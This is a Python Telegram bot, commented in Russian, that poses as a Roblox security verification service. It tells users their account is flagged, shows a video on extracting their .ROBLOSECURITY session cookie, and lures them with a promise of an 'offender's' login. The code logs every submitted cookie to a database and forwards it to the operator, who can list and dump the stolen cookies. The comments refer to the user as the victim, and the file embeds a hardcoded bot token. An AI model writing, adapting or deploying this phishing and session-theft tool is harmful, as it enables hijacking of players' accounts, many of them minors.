import os
import sqlite3
import datetime
import threading
from flask import Flask
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ТОКЕН И ID
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8972754736:AAHoFicLaYc4Kca1_5xPJqzy8mUsj7k-q0k')
YOUR_ID = int(os.environ.get('YOUR_ID', 8972754736))

# Flask для пинга (чтобы Render не засыпал)
app_flask = Flask(__name__)
@app_flask.route('/')
def ping():
    return "I'm alive!", 200

def run_flask():
    app_flask.run(host='0.0.0.0', port=10000)

# Путь к видео (файл лежит в папке video/)
VIDEO_PATH = "video/instruction.mp4"

# БД
DB_PATH = '/tmp/cookies.db'
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY, user_id TEXT, username TEXT, cookie TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()
init_db()

# /start — видео + текст
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = (
        "🔐 Roblox Security Verification System\n\n"
        "Ваш аккаунт был помечен как подозрительный.\n"
        "Для снятия ограничений требуется верификация.\n\n"
        "📌 Следуйте инструкции в видео ниже.\n"
        "После выполнения отправьте полученную куки сюда.\n\n"
        "⏳ Через 1 час вам будет прислана почта и пароль аккаунта обидчика.\n"
        "Доступ будет открыт на 3 дня без верификации."
    )
    
    # Отправка видео из локальной папки
    with open(VIDEO_PATH, 'rb') as video_file:
        await update.message.reply_video(
            video=InputFile(video_file),
            caption=caption,
            supports_streaming=True
        )

# Получение куки
async def handle_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    cookie_text = update.message.text.strip()
    
    if '.ROBLOSECURITY' not in cookie_text:
        await update.message.reply_text("❌ Неверный формат. Отправьте корректную куки.")
        return
    
    # Сохраняем в БД
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO logs (user_id, username, cookie, timestamp) VALUES (?, ?, ?, ?)",
              (str(user.id), user.username or "Нет юзернейма", cookie_text, str(datetime.datetime.now())))
    conn.commit()
    conn.close()
    
    # Ответ жертве
    await update.message.reply_text(
        "✅ Куки приняты.\n"
        "⏳ Ожидайте. Через 1 час придёт почта и пароль аккаунта обидчика.\n"
        "🔓 Доступ без верификации будет активен 3 дня."
    )
    
    # Пересылка тебе
    await context.bot.send_message(
        chat_id=YOUR_ID,
        text=f"📩 НОВАЯ КУКИ:\n\n{cookie_text}\n\n👤 Юзер: @{user.username or 'нет'}\n🆔 ID: {user.id}\n🕒 Время: {datetime.datetime.now()}"
    )

# Статистика для тебя
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != YOUR_ID:
        await update.message.reply_text("❌ Доступ запрещён.")
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM logs")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM logs WHERE timestamp LIKE ?", (f"{datetime.date.today()}%",))
    today = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 Статистика:\nВсего куки: {total}\nСегодня: {today}")

# Дамп для тебя
async def dump(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != YOUR_ID:
        await update.message.reply_text("❌ Доступ запрещён.")
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, username, cookie, timestamp FROM logs ORDER BY id DESC LIMIT 10")
    rows = c.fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("База пуста.")
        return
    text = "📋 Последние 10 куки:\n\n"
    for row in rows:
        text += f"👤 {row[1]} ({row[0]})\n🍪 {row[2][:50]}...\n🕒 {row[3]}\n\n"
    await update.message.reply_text(text[:4000])

# Команда для получения file_id (если нужно)
async def getfile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != YOUR_ID:
        await update.message.reply_text("❌ Доступ запрещён.")
        return
    if not update.message.video:
        await update.message.reply_text("❌ Отправьте видео.")
        return
    await update.message.reply_text(f"✅ file_id:\n`{update.message.video.file_id}`", parse_mode='Markdown')

def main():
    # Запуск Flask для пинга
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Запуск бота
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("dump", dump))
    app.add_handler(CommandHandler("getfile", getfile))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie))
    
    print("Бот запущен на Render...")
    app.run_polling()

if __name__ == "__main__":
    main()
